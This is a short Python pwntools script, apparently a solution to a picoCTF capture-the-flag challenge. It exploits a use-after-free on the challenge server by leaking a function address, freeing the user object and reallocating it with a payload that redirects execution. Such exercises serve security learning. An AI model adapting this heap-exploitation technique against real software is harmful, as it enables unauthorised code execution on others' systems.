from pwn import *

r = remote("mercury.picoctf.net", 4593)

# hahaexploitgobrrr address
r.recvuntil("(e)xit")
r.sendline("S")
r.recvuntil("OOP! Memory leak...")
address = int(r.recvline().rstrip(), 16)

print(f"Leaked address: {hex(address)}")

# free user
r.recvuntil("(e)xit")
r.sendline("I")
r.recvuntil("You're leaving already(Y/N)?")
r.sendline('Y')

# reallocate
r.recvuntil("(e)xit")
r.sendline("L")
r.recvuntil("try anyways:")

payload = p64(address)
print(f"Payload being sent: {payload}")
r.sendline(payload)

print(r.recvline().rstrip().decode())
print(r.recvline().rstrip().decode())